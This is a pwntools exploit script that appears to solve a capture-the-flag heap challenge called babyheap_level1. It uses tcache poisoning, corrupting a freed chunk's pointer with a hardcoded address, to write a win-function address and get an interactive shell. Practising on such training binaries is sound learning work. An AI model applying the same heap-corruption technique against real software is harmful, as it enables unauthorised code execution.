#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
os.chdir('/challenge') 
exe = context.binary = ELF('/challenge/babyheap_level1')
context.terminal = ["tmux", "splitw", "-h"]

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --
END_OF_MENU = b"Choice:"
SIZE_OF_CHUNK = b"chunk?:"
CONTENT = b"Content:"
INDEX = b"Index:"

def malloc(p, size):
    p.sendline(b"1")
    p.recvuntil(SIZE_OF_CHUNK)
    p.sendline(b"8")
    p.recvuntil(CONTENT)
    p.sendline(b"A"*8)
    p.recvuntil(END_OF_MENU)

def free(p, index):
    p.sendline(b"3")
    p.recvuntil(INDEX)
    p.sendline(b"%d" %index)
    p.recvuntil(END_OF_MENU)

def edit(p, index, content):
    p.sendline(b"2")
    p.recvuntil(INDEX)
    p.sendline(b"%d" %index)
    p.recvuntil(CONTENT)
    p.sendline(b"%b" %content)    
    p.recvuntil(END_OF_MENU)

def exit(p):
    p.sendline(b"6") 

def launch_attack(p):
    malloc(p, 8)
    free(p,0)
    pointer = p64(0x404080)
    edit(p, 0, pointer)
    malloc(p,8)
    malloc(p,8)
    # edit(p,2,p64(e.symbols.win))
    edit(p,2,p64(0x40139d))
    malloc(p,8)
    p.interactive()

io = start()
launch_attack(io)


